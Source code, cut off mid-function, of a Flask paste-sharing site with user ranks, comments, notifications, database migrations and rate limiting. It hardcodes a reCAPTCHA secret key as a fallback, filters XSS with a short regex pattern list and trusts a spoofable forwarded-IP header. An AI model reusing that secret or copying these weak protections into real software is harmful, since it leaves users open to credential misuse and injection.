from flask import Flask, render_template, request, redirect, session, url_for, flash, g, jsonify, Response
import os
import requests
import json
from datetime import datetime, timedelta, timezone
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import pytz
import humanize
import re
from markupsafe import Markup, escape
import pyotp
import qrcode
import io
import base64
from werkzeug.utils import secure_filename
import string
import random
import secrets
import hashlib
from threading import Lock
from collections import defaultdict, deque
from time import time
import subprocess

# Import security monitoring
from security_monitoring import check_request_security

# Security: File upload validation
try:
    import magic
    MAGIC_AVAILABLE = True
except ImportError:
    MAGIC_AVAILABLE = False
    print("Warning: python-magic not installed. MIME type validation disabled.")

# Enhanced registration security imports
import hashlib
import json
import re
from urllib.parse import urlparse


# Security: Function to get reCAPTCHA secret key from environment
def get_recaptcha_secret_key():
    return os.environ.get('RECAPTCHA_SECRET_KEY', '6LfkGncrAAAAAMkmjkqYyZoOL9NRbqO3ul80BNw9')

# Security: Function to get reCAPTCHA site key from environment
def get_recaptcha_site_key():
    return os.environ.get('RECAPTCHA_SITE_KEY', '6LfkGncrAAAAACAFCgbfJzEZQt8XIr69KTXWSIVp')

def get_file_version(filepath):
    """Get a version string for cache busting based on file modification time"""
    try:
        if os.path.exists(filepath):
            mtime = os.path.getmtime(filepath)
            return str(int(mtime))
        else:
            return str(int(time()))
    except:
        return str(int(time()))

import secrets

app = Flask(__name__)

# Security: Use environment variables for secrets
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))  # Secure random fallback
app.config['UPLOAD_FOLDER'] = 'static/files/pfp'
app.config['BANNER_UPLOAD_FOLDER'] = 'static/files/banners'
app.config['MUSIC_UPLOAD_FOLDER'] = 'static/files/music'
app.config['RECAPTCHA_SITE_KEY'] = get_recaptcha_site_key()

# File upload size limit: 20MB (highest limit for music files)
app.config['MAX_CONTENT_LENGTH'] = 20 * 1024 * 1024  # 20MB in bytes

# Security: CSRF Protection
# Global CSRF object
csrf = None
try:
    from flask_wtf.csrf import generate_csrf
    # Don't use CSRFProtect - we'll handle CSRF manually
    CSRF_ENABLED = True
    print("CSRF protection enabled with manual validation only")
except ImportError:
    # Flask-WTF not installed, disable CSRF
    CSRF_ENABLED = False
    print("Warning: Flask-WTF not installed. CSRF protection disabled.")

# Add CSRF token to template context
@app.context_processor
def inject_csrf_token():
    if CSRF_ENABLED:
        return {'csrf_token': lambda: generate_csrf()}
    else:
        return {'csrf_token': lambda: ''}

# Add cache busting function to template context
@app.context_processor
def inject_cache_busting():
    def get_cache_busting_version(filename):
        """Get cache busting version for static files"""
        if not filename:
            return str(int(time()))
        
        # Enhanced security: prevent directory traversal
        filename = os.path.basename(filename)  # Remove any path components
        if '..' in filename or filename.startswith('/') or '/' in filename:
            return str(int(time()))
        
        filepath = os.path.join('static', filename)
        return get_file_version(filepath)
    
    return {'get_cache_busting_version': get_cache_busting_version}

# Security: Add security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://netdna.bootstrapcdn.com; "
        "style-src-elem 'self' 'unsafe-inline' https://fonts.googleapis.com https://netdna.bootstrapcdn.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://www.google.com; "
        "frame-src https://www.google.com https://www.gstatic.com;"
    )
    return response

@app.after_request
def log_requests(response):
    """Log all requests for monitoring"""
    check_request_security(request, response.status_code)
    return response

@app.errorhandler(413)
def too_large(e):
    """Handle file upload size limit exceeded"""
    return "File too large. Maximum upload size is 20MB.", 413

# Define UTC timezone once at the top
UTC_TZ = pytz.UTC

DATABASE = 'database.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

try:

    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()

except:
    pass

def migrate_existing_comments():
    """Add IDs to existing comments that don't have them"""
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT pastname, comments FROM pasts WHERE comments IS NOT NULL AND comments != '[]'")
        pastes_with_comments = cursor.fetchall()
        
        updated_count = 0
        
        for paste in pastes_with_comments:
            pastname, comments_json = paste
            try:
                comments = json.loads(comments_json)
                needs_update = False
                
                for comment in comments:
                    if 'id' not in comment:
                        # Generate a unique ID for this comment
                        comment_id = secrets.token_hex(8)
                        
                        # Ensure the ID is unique within this paste's comments
                        existing_ids = [c.get('id') for c in comments if c.get('id')]
                        while comment_id in existing_ids:
                            comment_id = secrets.token_hex(8)
                        
                        comment['id'] = comment_id
                        needs_update = True
                
                if needs_update:
                    cursor.execute("UPDATE pasts SET comments = ? WHERE pastname = ?", (json.dumps(comments), pastname))
                    updated_count += 1
                    
            except json.JSONDecodeError:
                print(f"Warning: Invalid JSON in comments for paste {pastname}")
                continue
        
        if updated_count > 0:
            conn.commit()
            print(f"Migration completed: Added IDs to comments in {updated_count} pastes")
        else:
            print("Migration completed: No comments needed ID updates")
            
    except Exception as e:
        print(f"Error during comment migration: {e}")

def migrate_url_names():
    """Add URL-friendly names to existing pastes that don't have them"""
    cursor = conn.cursor()
    
    try:
        # Check if url_name column exists
        cursor.execute("PRAGMA table_info(pasts)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'url_name' not in columns:
            # Add url_name column without UNIQUE constraint first
            cursor.execute("ALTER TABLE pasts ADD COLUMN url_name TEXT")
            print("Added url_name column to pasts table")
        
        # Get all pastes that don't have url_name set
        cursor.execute("SELECT id, pastname FROM pasts WHERE url_name IS NULL")
        pastes_without_url = cursor.fetchall()
        
        updated_count = 0
        
        for paste in pastes_without_url:
            paste_id, pastname = paste
            url_name = create_url_friendly_name(pastname)
            
            # Ensure uniqueness by adding a number if needed
            original_url_name = url_name
            counter = 1
            while True:
                cursor.execute("SELECT id FROM pasts WHERE url_name = ? AND id != ?", (url_name, paste_id))
                if not cursor.fetchone():
                    break
                url_name = f"{original_url_name}-{counter}"
                counter += 1
            
            cursor.execute("UPDATE pasts SET url_name = ? WHERE id = ?", (url_name, paste_id))
            updated_count += 1
        
        if updated_count > 0:
            conn.commit()
            print(f"Migration completed: Added URL names to {updated_count} pastes")
        else:
            print("Migration completed: No pastes needed URL name updates")
        
        # Now add UNIQUE constraint if it doesn't exist
        try:
            cursor.execute("CREATE UNIQUE INDEX idx_pasts_url_name ON pasts(url_name)")
            print("Added UNIQUE constraint to url_name column")
        except sqlite3.OperationalError as e:
            if "already exists" in str(e):
                print("UNIQUE constraint already exists on url_name column")
            else:
                print(f"Warning: Could not add UNIQUE constraint: {e}")
            
    except Exception as e:
        print(f"Error during URL name migration: {e}")

def initdb():
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            status TEXT DEFAULT 'user',
            datejoin TEXT NOT NULL,
            bio TEXT,
            avatar TEXT,
            banner TEXT,
            music TEXT,
            otp_secret TEXT,
            otp_enabled BOOLEAN DEFAULT FALSE,
            username_changes INTEGER DEFAULT 0,
            username_color TEXT DEFAULT NULL,
            username_color_access INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_id INTEGER,
            pastname TEXT NOT NULL,
            url_name TEXT UNIQUE,
            date TEXT NOT NULL,
            hour TEXT NOT NULL,
            view TEXT NOT NULL,
            pin TEXT NOT NULL,
            email TEXT,
            comments TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS profile_comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            profile_user_id INTEGER NOT NULL,
            commenter_user_id INTEGER NOT NULL,
            comment TEXT NOT NULL,
            date TEXT NOT NULL,
            FOREIGN KEY (profile_user_id) REFERENCES users (id),
            FOREIGN KEY (commenter_user_id) REFERENCES users (id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS post_views (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pastname TEXT NOT NULL,
            session_id TEXT NOT NULL,
            last_viewed TEXT NOT NULL,
            UNIQUE(pastname, session_id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS password_reset_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            token TEXT UNIQUE NOT NULL,
            created_at TEXT NOT NULL,
            expires_at TEXT NOT NULL,
            used BOOLEAN DEFAULT FALSE,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pending_edits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            paste_url_name TEXT NOT NULL,
            editor_id INTEGER NOT NULL,
            editor_username TEXT NOT NULL,
            original_content TEXT NOT NULL,
            new_content TEXT NOT NULL,
            edit_reason TEXT NOT NULL,
            requested_at TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            reviewed_by TEXT,
            reviewed_at TEXT,
            FOREIGN KEY (editor_id) REFERENCES users (id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS follows (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            follower_id INTEGER NOT NULL,
            following_id INTEGER NOT NULL,
            created_at TEXT NOT NULL,
            FOREIGN KEY (follower_id) REFERENCES users (id),
            FOREIGN KEY (following_id) REFERENCES users (id),
            UNIQUE(follower_id, following_id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            type TEXT NOT NULL,
            title TEXT NOT NULL,
            message TEXT NOT NULL,
            related_user_id INTEGER,
            related_paste_id INTEGER,
            created_at TEXT NOT NULL,
            read_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (id),
            FOREIGN KEY (related_user_id) REFERENCES users (id),
            FOREIGN KEY (related_paste_id) REFERENCES pasts (id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS rate_limits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            identifier TEXT NOT NULL,
            action TEXT NOT NULL,
            attempt_time REAL NOT NULL,
            UNIQUE(identifier, action, attempt_time)
        )
    ''')
    conn.commit()
    
    # Migrate existing comments to have IDs
    migrate_existing_comments()
    migrate_url_names()
    
    # Migrate to add username_color column if it doesn't exist
    migrate_username_color()
    
    # Migrate to add username_color_access column if it doesn't exist
    migrate_username_color_access()
    
    # Migrate to remove IP address columns
    migrate_remove_ip_addresses()

    # Migrate to add account_locked column if it doesn't exist
    migrate_account_locked()

    # Migrate to add comments_disabled column if it doesn't exist
    migrate_comments_disabled()

    # Migrate to add edit_reason column to pending_edits table if it doesn't exist
    migrate_pending_edits_edit_reason()

    # Migrate to add music column to users table if it doesn't exist
    migrate_add_music_field()

    # Migrate to add rate limiting table if it doesn't exist
    migrate_rate_limiting_table()

    # Migrate to add device_fingerprint column to rate_limits table if it doesn't exist
    migrate_add_device_fingerprint()

    # Migrate to add deletion_reason column to pasts table if it doesn't exist
    migrate_deletion_reason()

def migrate_username_color():
    """Add username_color column to existing databases."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE users ADD COLUMN username_color TEXT DEFAULT NULL")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_username_color_access():
    """Add username_color_access column to existing databases."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE users ADD COLUMN username_color_access INTEGER DEFAULT 0")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_remove_ip_addresses():
    """Remove IP address columns from existing databases."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Check if columns exist before trying to drop them
        cursor.execute("PRAGMA table_info(users)")
        users_columns = [column[1] for column in cursor.fetchall()]
        if 'ip_address' in users_columns:
            cursor.execute("ALTER TABLE users DROP COLUMN ip_address")
        
        cursor.execute("PRAGMA table_info(pasts)")
        pasts_columns = [column[1] for column in cursor.fetchall()]
        if 'ip' in pasts_columns:
            cursor.execute("ALTER TABLE pasts DROP COLUMN ip")
        
        cursor.execute("PRAGMA table_info(profile_comments)")
        profile_comments_columns = [column[1] for column in cursor.fetchall()]
        if 'ip_address' in profile_comments_columns:
            cursor.execute("ALTER TABLE profile_comments DROP COLUMN ip_address")
        
        cursor.execute("PRAGMA table_info(post_views)")
        post_views_columns = [column[1] for column in cursor.fetchall()]
        if 'ip_address' in post_views_columns:
            cursor.execute("ALTER TABLE post_views DROP COLUMN ip_address")
        
        conn.commit()
        conn.close()
        print("Migration completed: Removed IP address columns from database")
    except sqlite3.OperationalError as e:
        # Column already removed or doesn't exist, ignore the error
        print(f"Migration note: {e}")
    except Exception as e:
        print(f"Error during IP address migration: {e}")

def migrate_account_locked():
    """Add account_locked column to existing databases."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE users ADD COLUMN account_locked BOOLEAN DEFAULT FALSE")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_comments_disabled():
    """Add comments_disabled column to existing databases."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE pasts ADD COLUMN comments_disabled BOOLEAN DEFAULT FALSE")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_pending_edits_edit_reason():
    """Add edit_reason column to pending_edits table if it doesn't exist."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE pending_edits ADD COLUMN edit_reason TEXT NOT NULL DEFAULT ''")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_add_music_field():
    """Add music column to users table if it doesn't exist."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE users ADD COLUMN music TEXT")
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_rate_limiting_table():
    """Add rate_limits table if it doesn't exist."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS rate_limits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                identifier TEXT NOT NULL,
                action TEXT NOT NULL,
                attempt_time REAL NOT NULL,
                device_fingerprint TEXT,
                UNIQUE(identifier, action, attempt_time)
            )
        ''')
        conn.commit()
        conn.close()
    except sqlite3.OperationalError:
        # Table already exists, ignore the error
        pass

def migrate_add_device_fingerprint():
    """Add device_fingerprint column to rate_limits table if it doesn't exist."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE rate_limits ADD COLUMN device_fingerprint TEXT")
        conn.commit()
        conn.close()
        print("Migration completed: Added device_fingerprint column to rate_limits table")
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def migrate_deletion_reason():
    """Add deletion_reason column to pasts table if it doesn't exist."""
    try:
        # Use direct database connection instead of Flask's get_db()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("ALTER TABLE pasts ADD COLUMN deletion_reason TEXT")
        conn.commit()
        conn.close()
        print("Migration completed: Added deletion_reason column to pasts table")
    except sqlite3.OperationalError:
        # Column already exists, ignore the error
        pass

def create_notification(user_id, notification_type, title, message, related_user_id=None, related_paste_id=None):
    """Create a notification for a user."""
    try:
        db = get_db()
        cursor = db.cursor()
        cursor.execute("""
            INSERT INTO notifications (user_id, type, title, message, related_user_id, related_paste_id, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (user_id, notification_type, title, message, related_user_id, related_paste_id, 
              datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S')))
        db.commit()
        return True
    except Exception as e:
        print(f"Error creating notification: {e}")
        return False

def get_username_change_limit(status):
    """Get the maximum number of username changes allowed for a given status."""
    limits = {
        'criminal': 2,
        'vip': 1,
        'rich': 3,
        'clique': 3,
        'helper': 3,
        'council': 3,
        'mod': 3,
        'manager': 3,
        'admin': 3,
        'root': 3,
        'user': 0  # Regular users cannot change username
    }
    return limits.get(status, 0)

def get_username_color(username):
    """Get the custom username color for a user, or return None if not set."""
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT username_color FROM users WHERE username = ?", (username,))
    result = cursor.fetchone()
    return result[0] if result else None

def can_upload_music(status):
    """Check if a user with the given status can upload music."""
    allowed_statuses = ['root', 'admin', 'manager', 'mod', 'council', 'helper', 'clique', 'rich']
    return status in allowed_statuses

def sanitize_chat_message(content):
    """Sanitize chat message content to prevent XSS and other attacks"""
    import re
    
    # Remove potentially dangerous HTML tags and attributes
    content = re.sub(r'<script.*?</script>', '', content, flags=re.IGNORECASE | re.DOTALL)
    content = re.sub(r'<.*?javascript:.*?>', '', content, flags=re.IGNORECASE)
    content = re.sub(r'<.*?on\w+\s*=\s*["\'].*?["\'].*?>', '', content, flags=re.IGNORECASE)
    content = re.sub(r'<iframe.*?</iframe>', '', content, flags=re.IGNORECASE | re.DOTALL)
    content = re.sub(r'<object.*?</object>', '', content, flags=re.IGNORECASE | re.DOTALL)
    content = re.sub(r'<embed.*?>', '', content, flags=re.IGNORECASE)
    
    # Remove other potentially dangerous patterns
    content = re.sub(r'javascript:', '', content, flags=re.IGNORECASE)
    content = re.sub(r'data:', '', content, flags=re.IGNORECASE)
    content = re.sub(r'vbscript:', '', content, flags=re.IGNORECASE)
    
    # Limit length
    content = content[:500]
    
    return content.strip()

def get_session_identifier():
    """
    Get a unique identifier for the current session.
    For logged-in users, use the username.
    For anonymous users, use a hash of the session ID and user agent.
    """
    if 'username' in session:
        return f"user:{session['username']}"
    else:
        session_id = session.get('session_id', '')
        user_agent = request.user_agent.string
        return f"anon:{hashlib.sha256((session_id + user_agent).encode()).hexdigest()}"

def get_device_fingerprint():
    """
    Generate a device fingerprint based on various browser characteristics.
    This provides additional uniqueness beyond IP address for rate limiting.
    """
    fingerprint_data = {}
    
    # Get basic request information
    fingerprint_data['user_agent'] = request.user_agent.string
    fingerprint_data['accept_language'] = request.headers.get('Accept-Language', '')
    fingerprint_data['accept_encoding'] = request.headers.get('Accept-Encoding', '')
    fingerprint_data['accept'] = request.headers.get('Accept', '')
    
    # Get additional headers that can help identify devices
    fingerprint_data['sec_ch_ua'] = request.headers.get('Sec-CH-UA', '')
    fingerprint_data['sec_ch_ua_mobile'] = request.headers.get('Sec-CH-UA-Mobile', '')
    fingerprint_data['sec_ch_ua_platform'] = request.headers.get('Sec-CH-UA-Platform', '')
    fingerprint_data['sec_ch_ua_platform_version'] = request.headers.get('Sec-CH-UA-Platform-Version', '')
    fingerprint_data['sec_ch_ua_model'] = request.headers.get('Sec-CH-UA-Model', '')
    
    # Get referer and origin
    fingerprint_data['referer'] = request.headers.get('Referer', '')
    fingerprint_data['origin'] = request.headers.get('Origin', '')
    
    # Get connection info
    fingerprint_data['connection'] = request.headers.get('Connection', '')
    fingerprint_data['upgrade_insecure_requests'] = request.headers.get('Upgrade-Insecure-Requests', '')
    
    # Create a hash of the fingerprint data
    fingerprint_string = json.dumps(fingerprint_data, sort_keys=True)
    return hashlib.sha256(fingerprint_string.encode()).hexdigest()

def check_device_fingerprint_rate_limit(device_fingerprint, action, max_attempts, window_seconds):
    """
    Check if a device fingerprint has exceeded the rate limit for a given action.
    This provides additional protection beyond IP-based rate limiting.
    """
    if not device_fingerprint:
        return True  # Allow if no device fingerprint available
    
    try:
        db = get_db()
        cursor = db.cursor()
        
        # Remove expired attempts
        cursor.execute("DELETE FROM rate_limits WHERE identifier = ? AND action = ? AND attempt_time < ?", 
                      (device_fingerprint, action, time() - window_seconds))
        
        # Count current attempts
        cursor.execute("SELECT COUNT(*) FROM rate_limits WHERE identifier = ? AND action = ?", 
                      (device_fingerprint, action))
        current_attempts = cursor.fetchone()[0]
        
        # Check if the maximum number of attempts has been reached
        if current_attempts >= max_attempts:
            db.commit()
            return False
        
        db.commit()
        return True
        
    except Exception as e:
        print(f"Error in device fingerprint rate limiting: {e}")
        return True  # Allow if there's an error

def detect_suspicious_device_fingerprint(device_data):
    """
    Detect potentially suspicious or spoofed device fingerprints.
    Returns True if suspicious, False if normal.
    """
    if not device_data:
        return False
    
    try:
        # Check for missing or empty critical fields
        critical_fields = ['user_agent', 'screen_width', 'screen_height', 'platform']
        for field in critical_fields:
            if not device_data.get(field) or device_data.get(field) == '':
                return True
        
        # Check for suspicious screen dimensions (too small or too large)
        screen_width = device_data.get('screen_width', 0)
        screen_height = device_data.get('screen_height', 0)
        if screen_width < 200 or screen_height < 200 or screen_width > 10000 or screen_height > 10000:
            return True
        
        # Check for suspicious user agent patterns
        user_agent = device_data.get('user_agent', '').lower()
        suspicious_patterns = [
            'bot', 'crawler', 'spider', 'scraper', 'headless',
            'phantom', 'selenium', 'webdriver', 'automation'
        ]
        for pattern in suspicious_patterns:
            if pattern in user_agent:
                return True
        
        # Check for suspicious platform values
        platform = device_data.get('platform', '').lower()
        if platform in ['', 'unknown', 'undefined', 'null']:
            return True
        
        return False
        
    except Exception as e:
        print(f"Error detecting suspicious device fingerprint: {e}")
        return True  # Treat as suspicious if there's an error

def log_suspicious_registration_attempt(ip_address, device_data, reason):
    """
    Log suspicious registration attempts for security monitoring.
    """
    try:
        timestamp = datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S')
        log_entry = {
            'timestamp': timestamp,
            'ip_address': ip_address,
            'device_data': device_data,
            'reason': reason,
            'user_agent': request.user_agent.string if request.user_agent else 'Unknown'
        }
        
        # Log to security log file
        with open('logs/security.log', 'a', encoding='utf-8') as log_file:
            log_file.write(f"SUSPICIOUS_REGISTRATION: {json.dumps(log_entry)}\n")
        
        print(f"Security alert: Suspicious registration attempt from {ip_address}: {reason}")
        
    except Exception as e:
        print(f"Error logging suspicious registration attempt: {e}")

def check_rapid_registration_attempts(device_identifier, max_attempts=3, window_seconds=300):
    """
    Check for rapid registration attempts from the same device (anti-spam protection).
    Returns True if too many rapid attempts, False otherwise.
    """
    if not device_identifier:
        return False
    
    try:
        db = get_db()
        cursor = db.cursor()
        
        # Remove expired attempts
        cursor.execute("DELETE FROM rate_limits WHERE identifier = ? AND action = ? AND attempt_time < ?", 
                      (device_identifier, 'register', time() - window_seconds))
        
        # Count current attempts in the short window
        cursor.execute("SELECT COUNT(*) FROM rate_limits WHERE identifier = ? AND action = ?", 
                      (device_identifier, 'register'))
        current_attempts = cursor.fetchone()[0]
        
        # Check if the maximum number of rapid attempts has been reached
        if current_attempts >= max_attempts:
            db.commit()
            return True
        
        db.commit()
        return False
        
    except Exception as e:
        print(f"Error checking rapid registration attempts: {e}")
        return False  # Allow if there's an error


def get_ip_identifier():
    """
    Get a unique identifier based on IP address and device fingerprint for rate limiting.
    This provides better tracking for registration limits by combining IP and device characteristics.
    """
    # Get the real IP address, handling proxies
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Get device fingerprint
    device_fp = get_device_fingerprint()
    
    # Combine IP and device fingerprint for more unique identification
    combined = f"{ip}:{device_fp}"
    return f"ip_device:{hashlib.sha256(combined.encode()).hexdigest()}"

def check_rate_limit(identifier, action, max_attempts, window_seconds):
    """
    Check if the rate limit for a given action has been exceeded for the given identifier.
    Returns True if the limit has not been exceeded, False otherwise.
    """
    now = time()
    rate_limit_key = f"{identifier}:{action}"
    
    # Initialize rate limit data from session or create new
    if 'rate_limit_data' in session:
        rate_limit_data = session['rate_limit_data']
    else:
        rate_limit_data = {}
    
    # Get the attempts list for this rate limit key (convert from list to deque for processing)
    attempts_list = rate_limit_data.get(rate_limit_key, [])
    attempts = deque(attempts_list, maxlen=max_attempts)
    
    # Remove expired attempts
    while attempts and attempts[0] < now - window_seconds:
        attempts.popleft()
    
    # Check if the maximum number of attempts has been reached
    if len(attempts) >= max_attempts:
        return False
    
    # Add the current attempt
    attempts.append(now)
    
    # Convert deque back to list for JSON serialization and store in session
    rate_limit_data[rate_limit_key] = list(attempts)
    session['rate_limit_data'] = rate_limit_data
    session.permanent = True
    
    return True

def check_persistent_rate_limit(identifier, action, max_attempts, window_seconds):
    """
    Check if the rate limit for a given action has been exceeded for the given identifier.
    Uses database storage for persistent rate limiting across sessions.
    Returns True if the limit has not been exceeded, False otherwise.
    """
    now = time()
    
    try:
        db = get_db()
        cursor = db.cursor()
        
        # Remove expired attempts
        cursor.execute("DELETE FROM rate_limits WHERE identifier = ? AND action = ? AND attempt_time < ?", 
                      (identifier, action, now - window_seconds))
        
        # Count current attempts
        cursor.execute("SELECT COUNT(*) FROM rate_limits WHERE identifier = ? AND action = ?", 
                      (identifier, action))
        current_attempts = cursor.fetchone()[0]
        
        # Check if the maximum number of attempts has been reached
        if current_attempts >= max_attempts:
            db.commit()
            return False
        
        # Add the current attempt
        cursor.execute("INSERT INTO rate_limits (identifier, action, attempt_time) VALUES (?, ?, ?)", 
                      (identifier, action, now))
        db.commit()
        
        return True
        
    except Exception as e:
        print(f"Error in persistent rate limiting: {e}")
        # Fallback to session-based rate limiting
        return check_rate_limit(identifier, action, max_attempts, window_seconds)

def check_persistent_rate_limit_only(identifier, action, max_attempts, window_seconds):
    """
    Check if the rate limit for a given action has been exceeded for the given identifier.
    This function only checks the limit without recording the attempt.
    Returns True if the limit has not been exceeded, False otherwise.
    """
    now = time()
    
    try:
        db = get_db()
        cursor = db.cursor()
        
        # Remove expired attempts
        cursor.execute("DELETE FROM rate_limits WHERE identifier = ? AND action = ? AND attempt_time < ?", 
                      (identifier, action, now - window_seconds))
        
        # Count current attempts
        cursor.execute("SELECT COUNT(*) FROM rate_limits WHERE identifier = ? AND action = ?", 
                      (identifier, action))
        current_attempts = cursor.fetchone()[0]
        
        # Check if the maximum number of attempts has been reached
        if current_attempts >= max_attempts:
            db.commit()
            return False
        
        db.commit()
        return True
        
    except Exception as e:
        print(f"Error in persistent rate limiting check: {e}")
        # Fallback to session-based rate limiting
        return check_rate_limit(identifier, action, max_attempts, window_seconds)

def record_persistent_rate_limit_attempt(identifier, action):
    """
    Record a successful attempt for rate limiting purposes.
    """
    now = time()
    
    try:
        db = get_db()
        cursor = db.cursor()
        
        # Get device fingerprint for additional tracking
        device_fp = get_device_fingerprint()
        
        # Add the current attempt with device fingerprint
        cursor.execute("INSERT INTO rate_limits (identifier, action, attempt_time, device_fingerprint) VALUES (?, ?, ?, ?)", 
                      (identifier, action, now, device_fp))
        db.commit()
        
    except Exception as e:
        print(f"Error recording persistent rate limit attempt: {e}")

DATA = os.path.join(os.getcwd(), "data")
ADMIN_PASTES = os.path.join(os.getcwd(), "data", "admin")
ANON_PASTES = os.path.join(os.getcwd(), "data", "other")

with open(os.path.join(DATA, "template"), "r", encoding="utf-8") as temp_file:
    _DEFAULT_POST_TEMPLATE = temp_file.read()

admin_posts_list = []
anon_posts_list = []
pinned_posts_list = []
loosers_list = []

def refreshLoosers():
    global loosers_list
    with open(os.path.join(DATA, "hol.json"), "r", encoding="utf-8") as file:
        data = json.load(file)

    if not(len(loosers_list) == len(data["loosers"])):
        loosers_list = []
        for looser in data["loosers"]:
            if isinstance(looser, dict):
                loosers_list.append(looser)


def refreshAdminPosts(): # Cruiq
    global admin_posts_list
    admin_posts_file_list = os.listdir(ADMIN_PASTES)
    admin_posts_list = []
    for admin_post_file_name in admin_posts_file_list:
        admin_post_file_name_path = os.path.join(
            ADMIN_PASTES, admin_post_file_name)
        admin_post_file_name_stats = os.stat(admin_post_file_name_path)
        admin_posts_list.append(
            {
                "name": admin_post_file_name,
                "size": bytes2KB(admin_post_file_name_stats.st_size),
                "creation_date": datetime.utcfromtimestamp(int(admin_post_file_name_stats.st_mtime)).strftime('%d-%m-%Y'),
                "creation_time": datetime.utcfromtimestamp(int(admin_post_file_name_stats.st_mtime)).strftime('%H:%M:%S')
            }
        )

def refreshAnonPosts():
    try:
        global anon_posts_list, pinned_posts_list
        
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT p.*, u.username as pastowner, u.status as pastownerstatus
            FROM pasts p
            LEFT JOIN users u ON p.owner_id = u.id
            WHERE p.pending_deletion IS NULL OR p.pending_deletion = 0
            ORDER BY p.date DESC, p.hour DESC
        ''')
        all_pastes = cursor.fetchall()
        
        conn.row_factory = None

        anon_posts_list = []
        pinned_posts_list = []
        
